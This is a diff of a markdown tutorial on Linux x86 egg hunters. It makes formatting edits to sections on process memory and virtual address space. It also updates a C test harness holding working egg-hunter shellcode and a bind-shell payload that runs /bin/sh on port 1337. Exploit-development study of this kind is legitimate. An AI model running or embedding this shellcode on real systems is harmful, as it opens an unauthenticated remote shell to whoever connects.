@@ -15,6 +15,7 @@ The purpose of an egg hunter is to search for a given egg/tag/key/pattern. The p
 
 Before I explain what the VAS is, let's look at the memory layout of a linux process. Table 1 visualizes how the memory layout looks like.
 
+<div align="center">
 | Process Memory layout |
 | --------------------- |
 | Kernel Space          |
@@ -24,17 +25,20 @@ Before I explain what the VAS is, let's look at the memory layout of a linux pro
 | BSS                   |
 | Data                  |
 | Text                  |
+
 Table 1: Memory layout of a process
+</div>
 
 This is how programs are structured. For example, the `Text` segment contains the assembly instructions, the `Data` segment contains initialized global and static variables, and the `BSS` segment contains uninitialized variables.
 
 However, these segments can be spread out when looking at the physical memory address space, meaning the RAM. So how does your operating system know where a segment is and which segments belongs to the correct process? You most likely have multiple programs running at any given time.
 
-This is where the virtual address space comes into play. When you execute a process, your operating system assigns a virtual address space for your process. This not only isolates the process from other running processes, but also tricks the process into thinking that there only exists one space and that the process occupies it. This can be visualised in figure 1:
+This is where the virtual address space comes into play. When you execute a process, your operating system assigns a virtual address space for your process. This not only isolates the process from other running processes, but also tricks the process into thinking that there only exists one space and that the process occupies it. This can be visualized in figure 1:
 
 
 ![vas](vas.png)
-Figure 1: Virtual address space vs Physical address space. [1]
+
+<p align="center">Figure 1: Virtual address space vs Physical address space. [1]</p>
 
 The CPU will in turn convert a virtual address to a physical address in order to perform its operations. But wait! There's more :) To make things easier, the virtual and physical address space is further divided into `pages`. More on this in the next section.
 
@@ -248,7 +252,14 @@ Now we can create a program that will execute our egg hunter and hopefully find 
 
 unsigned char hunter[] = "\xbb\xef\xbe\xad\xde\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\x8d\x5a\x08\xff\xe3";
 
-unsigned char shellcode[] = "\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+unsigned char shellcode[] = \
+        "\xef\xbe\xad\xde\xef\xbe\xad\xde"
+        "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+        "\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a"
+        "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+        "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+        "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+        "\x0b\xcd\x80";
 
 main()
 {
@@ -260,9 +271,9 @@ main()
 }
 ```
 
-Compiling with `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` and running ./shellcode yields the following result:
+Compiling with `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` and running `./shellcode` yields the following result:
 
-![result](result.png)
+![result](egghunter-result.png)
 
 Yay it works!
 
